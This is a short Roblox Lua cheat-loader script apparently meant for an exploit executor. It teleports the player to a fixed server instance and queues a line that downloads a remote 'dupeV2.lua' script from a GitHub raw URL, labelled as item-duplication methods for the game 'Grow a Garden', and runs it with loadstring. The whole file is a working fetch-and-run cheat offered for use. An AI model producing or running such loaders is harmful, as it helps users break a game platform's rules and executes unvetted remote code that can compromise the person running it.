local TeleportService = cloneref(game:GetService("TeleportService"))  
local jobId = '57d478b2-4f1d-407f-9df5-6fae31828712' 

queue_on_teleport([[  
    loadstring(game:HttpGet('https://raw.githubusercontent.com/scytheXlol/Grow-A-Garden-OP-Methods/refs/heads/main/dupeV2.lua'))()
]])

TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId) 
